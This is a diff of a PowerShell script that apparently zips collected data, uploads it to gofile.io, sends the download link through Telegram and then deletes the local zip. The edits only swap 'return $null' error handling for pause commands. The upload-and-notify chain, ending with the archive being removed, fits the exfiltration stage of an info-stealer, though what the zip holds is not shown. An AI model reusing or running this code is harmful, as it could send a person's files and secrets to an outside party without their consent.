@@ -53,7 +53,7 @@ function Upload-FileAndGetLink {
     $serverResponse = Invoke-RestMethod -Uri 'https://api.gofile.io/getServer'
     if ($serverResponse.status -ne "ok") {
         Write-Host "Failed to get server URL: $($serverResponse.status)"
-        return $null
+        cmd /c 'pause'
     }
 
     # Define the upload URI
@@ -79,12 +79,12 @@ function Upload-FileAndGetLink {
         $response = Invoke-RestMethod -Uri $uploadUri -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $bodyLines
         if ($response.status -ne "ok") {
             Write-Host "Failed to upload file: $($response.status)"
-            return $null
+            cmd /c 'pause'
         }
         return $response.data.downloadPage
     } catch {
         Write-Host "Failed to upload file: $_"
-        return $null
+        cmd /c 'pause'
     }
 }
 
@@ -122,8 +122,10 @@ $link = Upload-FileAndGetLink -filePath $outputZip
 # Check if the upload was successful and send the link via Telegram
 if ($link -ne $null) {
     Send-TelegramMessage -message "Download link: $link"
+    cmd /c 'pause'
 } else {
     Send-TelegramMessage -message "Failed to upload file to gofile.io"
+    cmd /c 'pause'
 }
 cmd /c 'pause'
 # Remove the zip file after uploading
